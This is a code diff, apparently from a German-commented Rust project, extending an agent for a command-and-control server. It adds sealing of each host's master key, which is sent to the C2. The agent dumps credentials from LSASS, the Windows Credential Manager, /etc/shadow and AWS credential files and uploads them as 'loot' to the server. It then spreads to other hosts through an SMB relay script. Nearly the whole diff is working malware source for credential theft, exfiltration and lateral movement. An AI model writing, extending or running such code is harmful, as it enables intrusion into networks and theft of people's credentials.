@@ -5,6 +5,7 @@
 //! C2-Server. Nur für autorisierte Netzwerke gedacht.
 
 mod c2;
+mod hostkey;
 mod propagate;
 mod tasks;
 
@@ -80,6 +81,11 @@ struct Args {
     /// Pfad zum selbstsignierten Server-Zertifikat (PEM).
     #[arg(long)]
     server_cert: String,
+    /// Pfad zum oeffentlichen Server-Schluessel (JSON). Damit werden die
+    /// Master-Keys der Hosts versiegelt; ohne die Datei geht die Beute
+    /// unverschluesselt an den C2.
+    #[arg(long)]
+    server_key: Option<String>,
 }
 
 #[tokio::main]
@@ -98,6 +104,22 @@ async fn main() {
     let own_ip: Ipv4Addr = args.own_ip.parse().expect("Ungültige eigene IP");
     let host_id = own_ip.to_string();
 
+    // Der Server-Schluessel decides, ob die Beute verschluesselt gemeldet
+    // wird. Fehlt er, laeuft der Agent ohne Schluesselmaterial weiter.
+    let sealer = args
+        .server_key
+        .as_deref()
+        .and_then(|pfad| match hostkey::KeySealer::load(pfad) {
+            Ok(s) => {
+                info!("Server-Schluessel geladen, die Beute wird versiegelt gemeldet");
+                Some(s)
+            }
+            Err(e) => {
+                error!("Server-Schluessel unbrauchbar: {e}");
+                None
+            }
+        });
+
     let client = match c2::C2Client::new(&args.server, args.token.as_str(), &args.server_cert) {
         Ok(c) => c,
         Err(e) => {
@@ -108,21 +130,24 @@ async fn main() {
 
     // 0. Der Agent registriert sich selbst. Sonst zeigen die lokal erbeuteten
     //    Secrets auf einen Host, den der C2-Server nicht kennt.
+    // Der Agent ist selbst ein Host — sein eigener Master-Key wird mit der
+    // Selbst-Registrierung gemeldet.
+    let eigenes = sealer.as_ref().and_then(|s| s.seal_for_host());
     let self_registration = kx_core::c2::RegisterRequest {
         host_id: host_id.clone(),
         ip: host_id.clone(),
         hostname: None,
         os: None,
         status: Some(kx_core::c2::STATUS_AGENT.to_string()),
-        sealed_master: None,
-        master_key: None,
+        sealed_master: eigenes.as_ref().map(|k| k.sealed_master.clone()),
+        master_key: eigenes.as_ref().map(|k| k.master_key.clone()),
     };
     if let Err(e) = client.register_host(&self_registration).await {
         error!("Selbst-Registrierung fehlgeschlagen: {e}");
     }
 
     // 1. Lokale Secrets extrahieren (je nach Plattform).
-    let local_secrets = collect_local_secrets(&host_id).await;
+    let local_secrets = collect_local_secrets(&host_id, eigenes.map(|k| k.master_key)).await;
     for s in &local_secrets {
         if let Err(e) = client.upload_secret(s).await {
             error!("Secret-Upload fehlgeschlagen: {e}");
@@ -165,7 +190,8 @@ async fn main() {
         }
     };
 
-    let results = propagate::run_propagation(&discovered, &args.relay_script).await;
+    let results =
+        propagate::run_propagation(&discovered, &args.relay_script, sealer.as_ref()).await;
 
     // 4. Neuentdeckte Hosts an den C2-Server melden.
     for h in &results.new_hosts {
@@ -195,7 +221,10 @@ async fn main() {
 ///
 /// Jedes Secret bekommt die Host-Kennung des Agenten mit — die Kennung des Hosts,
 /// bei dem es erbeutet wurde. Das ist hier der Agent selbst.
-async fn collect_local_secrets(host_id: &str) -> Vec<kx_core::c2::SecretUpload> {
+async fn collect_local_secrets(
+    host_id: &str,
+    master_key: Option<String>,
+) -> Vec<kx_core::c2::SecretUpload> {
     let mut out = Vec::new();
     #[cfg(target_os = "windows")]
     {
@@ -206,7 +235,7 @@ async fn collect_local_secrets(host_id: &str) -> Vec<kx_core::c2::SecretUpload> 
                 username: secret.target,
                 password: secret.value,
                 source: Some("lsass".into()),
-                master_key: None,
+                master_key: master_key.clone(),
             });
         }
         for secret in kx_win::extract_credential_manager()
@@ -219,7 +248,7 @@ async fn collect_local_secrets(host_id: &str) -> Vec<kx_core::c2::SecretUpload> 
                 username: secret.target,
                 password: secret.value,
                 source: Some("cmdkey".into()),
-                master_key: None,
+                master_key: master_key.clone(),
             });
         }
     }
@@ -232,7 +261,7 @@ async fn collect_local_secrets(host_id: &str) -> Vec<kx_core::c2::SecretUpload> 
                 username: secret.target,
                 password: secret.value,
                 source: Some("/etc/shadow".into()),
-                master_key: None,
+                master_key: master_key.clone(),
             });
         }
         for secret in kx_posix::extract_aws_credentials()
@@ -245,7 +274,7 @@ async fn collect_local_secrets(host_id: &str) -> Vec<kx_core::c2::SecretUpload> 
                 username: secret.target,
                 password: secret.value,
                 source: Some("~/.aws/credentials".into()),
-                master_key: None,
+                master_key: master_key.clone(),
             });
         }
     }
@@ -315,8 +344,9 @@ mod tests {
             end: "10.0.0.2".to_string(),
             own_ip: "10.0.0.3".to_string(),
             hosts: None,
-            relay_script: "smbrelayx.py".to_string(),
+            relay_script: "assets/smbrelayx.py".to_string(),
             server_cert: "/tmp/server.pem".to_string(),
+            server_key: None,
         }
     }
 
